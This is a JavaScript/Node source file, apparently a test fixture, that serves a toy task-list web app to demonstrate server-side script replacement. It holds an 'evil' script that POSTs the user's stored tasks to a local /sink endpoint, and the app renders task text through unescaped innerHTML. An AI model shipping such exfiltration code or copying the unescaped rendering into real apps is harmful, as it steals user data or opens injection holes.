// The baseline: an ordinary web app, built the usual way. A small task list served as HTML plus one
// script. Tasks are saved in localStorage; the half-typed draft lives in the input, as in most apps.
// The server can "deploy" a different script at any time, which is how web apps change.
import { createServer } from "node:http";

const page = `<!doctype html><meta charset="utf-8"><title>Tasks</title>
<body><div id="app"></div><div style="height:3000px"></div><script src="/app.js"></script></body>`;

const app = (v) => `
const tasks = JSON.parse(localStorage.getItem("tasks") || "[]");
const root = document.getElementById("app");
function draw() {
  root.innerHTML = '<h1>${v === 1 ? "Tasks" : "Tasks v2"}</h1><input id="draft" placeholder="New task"><button id="add">Add</button><ul>' +
    tasks.map((t) => '<li class="${v === 1 ? "task" : "item"}">' + t.text + ${v === 1 ? '""' : '" (priority " + (t.pri ?? 1) + ")"'} + '</li>').join("") + '</ul>';
  document.getElementById("add").onclick = () => { const d = document.getElementById("draft"); if (d.value) { tasks.push({ text: d.value }); localStorage.setItem("tasks", JSON.stringify(tasks)); draw(); } };
}
${v === 2 ? 'for (const t of tasks) t.pri ??= 1; localStorage.setItem("tasks", JSON.stringify(tasks));' : ""}
draw();
window.__appVersion = ${v};
`;
// What an attacker who controls the server (or the CDN, or the build) would ship.
const evil = `document.title = "pwned"; fetch("/sink", { method: "POST", body: localStorage.getItem("tasks") || "" }); window.__appVersion = "evil";`;

export function startWebApp() {
  const state = { deployed: 1, sink: [] };
  const server = createServer((req, res) => {
    if (req.url === "/app.js") { res.setHeader("content-type", "text/javascript"); res.setHeader("cache-control", "no-store"); return res.end(state.deployed === "evil" ? evil : app(state.deployed)); }
    if (req.url === "/sink") { let b = ""; req.on("data", (c) => (b += c)); req.on("end", () => { state.sink.push(b); res.end("ok"); }); return; }
    res.setHeader("content-type", "text/html"); res.end(page);
  }).listen(0);
  return { state, url: `http://127.0.0.1:${server.address().port}/`, close: () => server.close() };
}
